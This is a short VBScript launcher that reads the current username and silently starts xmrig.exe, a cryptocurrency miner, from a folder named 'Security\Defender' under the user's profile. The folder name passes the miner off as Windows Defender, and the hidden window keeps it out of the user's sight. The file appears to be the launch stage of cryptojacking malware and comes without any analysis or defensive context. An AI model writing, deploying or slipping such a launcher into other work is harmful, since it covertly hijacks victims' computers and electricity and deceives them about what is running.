Set WshShell = CreateObject("WScript.Shell")
Dim UserName : UserName = WshShell.ExpandEnvironmentStrings("%USERNAME%")
Dim ExePath  : ExePath  = "C:\Users\" & UserName & "\Security\Defender\xmrig.exe"
WshShell.CurrentDirectory = "C:\Users\" & UserName & "\Security\Defender"
WshShell.Run """" & ExePath & """", 0, False